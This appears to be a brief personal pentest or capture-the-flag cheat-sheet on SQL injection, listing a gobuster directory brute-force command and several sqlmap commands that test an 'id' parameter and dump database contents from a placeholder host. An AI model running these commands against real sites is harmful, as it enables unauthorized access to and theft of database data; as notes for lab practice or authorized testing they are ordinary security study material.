# sql-injection

gobuster -w /usr/shrare/wordlist/dirbuster/directory-list-2.3-small.txt -u http://url

sqlmap -r filename.req -p id

check union injectable

sqlmap -u http://host.com/cat.php?id=1 -p id --dump

sqlmap -r filename.req -p id --dump
